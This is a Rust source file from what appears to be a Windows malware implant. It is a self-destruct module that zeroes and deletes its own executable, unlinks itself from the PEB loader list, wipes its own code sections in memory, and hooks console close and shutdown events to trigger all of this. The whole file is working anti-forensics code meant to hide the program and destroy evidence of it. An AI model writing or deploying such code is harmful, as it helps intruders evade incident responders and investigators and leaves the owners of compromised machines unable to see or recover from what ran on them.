//! selfdestruct.rs — Forensic cleanup: wipe own disk file, PEB unlink, full teardown.
#![allow(dead_code, non_snake_case)]

use winapi::um::fileapi::{
    CreateFileW, WriteFile, SetEndOfFile, OPEN_EXISTING,
};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::consoleapi::SetConsoleCtrlHandler;
use winapi::um::processthreadsapi::{GetCurrentProcess, TerminateProcess};
use winapi::um::winnt::{
    GENERIC_WRITE, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_DELETE_ON_CLOSE,
    DELETE, FILE_SHARE_DELETE,
};
use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

unsafe fn own_image_path() -> Vec<u16> {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let params  = *(peb.add(0x20) as *const *const u8);
    let len     = *(params.add(0x60) as *const u16) as usize / 2;
    let buf_ptr = *(params.add(0x68) as *const *const u16);
    let mut v: Vec<u16> = core::slice::from_raw_parts(buf_ptr, len).to_vec();
    v.push(0);
    v
}

pub unsafe fn wipe_self() {
    let path = own_image_path();
    let h = CreateFileW(
        path.as_ptr(),
        GENERIC_WRITE | DELETE,
        FILE_SHARE_DELETE,
        core::ptr::null_mut(),
        OPEN_EXISTING,                          // open existing exe, not create new
        FILE_FLAG_DELETE_ON_CLOSE | FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );
    if h == INVALID_HANDLE_VALUE { return; }
    let zeros = vec![0u8; 65536];
    let mut written: DWORD = 0;
    WriteFile(h, zeros.as_ptr() as *const _, zeros.len() as DWORD,
              &mut written, core::ptr::null_mut());
    SetEndOfFile(h);
    CloseHandle(h);
}

unsafe fn unlink_from_peb() {
    let peb: usize;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr       = *((peb + 0x18) as *const usize) as *const u8;
    let list_head = ldr.add(0x10) as *const usize;
    let mut flink = *list_head as *const u8;

    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = own_base & !0xFFFF;

    loop {
        let entry_base = *(flink.add(0x30) as *const usize);
        if entry_base == own_base {
            let this_flink = *(flink as *const usize);
            let this_blink = *((flink as usize + 8) as *const usize);
            *(this_blink as *mut usize) = this_flink;
            *((this_flink + 8) as *mut usize) = this_blink;
            break;
        }
        let next = *(flink as *const usize);
        if next == *list_head { break; }
        flink = next as *const u8;
    }
}

#[allow(dead_code)]
unsafe fn peb_session_id() -> u32 {
    let peb: *const usize;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    // SessionId at PEB+0x10 on x64: wrapping_add(2) = +16 bytes (usize = 8 bytes each)
    let sid_ptr = peb.wrapping_add(2) as *const u32;
    sid_ptr.read_unaligned()
}

unsafe fn zero_text_section() {
    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = (own_base & !0xFFFF) as *const u8;
    let pe_off   = *(own_base.add(0x3C) as *const u32) as usize;
    let nt       = own_base.add(pe_off);
    let num_sec  = *(nt.add(0x06) as *const u16) as usize;
    let opt_sz   = *(nt.add(0x14) as *const u16) as usize;
    let sec_start= nt.add(0x18 + opt_sz);
    for i in 0..num_sec {
        let sec   = sec_start.add(i * 0x28);
        let chars = *(sec.add(0x24) as *const u32);
        if chars & 0x20000000 == 0 { continue; }
        let rva  = *(sec.add(0x0C) as *const u32) as usize;
        let size = *(sec.add(0x08) as *const u32) as usize;
        let ptr  = own_base.add(rva) as *mut u8;
        core::ptr::write_bytes(ptr, 0u8, size);
    }
}

pub unsafe fn full_destruct() -> ! {
    wipe_self();
    unlink_from_peb();
    zero_text_section();
    TerminateProcess(GetCurrentProcess(), 0);
    loop {}
}

unsafe extern "system" fn ctrl_handler(ctrl_type: DWORD) -> BOOL {
    match ctrl_type {
        0 | 1 | 2 | 5 | 6 => { full_destruct(); }
        _ => {}
    }
    FALSE
}

pub unsafe fn register_ctrl_handler() {
    SetConsoleCtrlHandler(Some(ctrl_handler), TRUE);
}
